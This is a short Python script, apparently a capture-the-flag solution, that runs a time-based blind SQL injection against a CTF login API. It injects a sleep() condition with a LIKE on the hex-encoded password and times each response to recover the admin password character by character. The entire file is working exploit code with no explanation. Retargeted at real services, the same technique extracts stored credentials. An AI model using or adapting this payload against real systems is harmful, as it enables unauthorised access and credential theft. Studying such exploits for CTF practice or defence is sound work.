import requests
import binascii
from time import time
import urllib.parse

url = 'http://web.ifctf.fibonhack.it:3010/api/v1/login'
dictionary = '0123456789abcdef'
result = ''

while True:
	for c in dictionary:
		question=f"-1' or (select sleep(1) from users where username='admin' and hex(password) like '{result+c}%')=1 -- -"
		start=time()
		requests.post(url, data={"username":"admin","password":question})
		elapsed=time()-start
		if elapsed>1:
			result+=c
			print(result)
			break
	else:
		break
result = bytes.fromhex(result).decode("ASCII")
print(result)



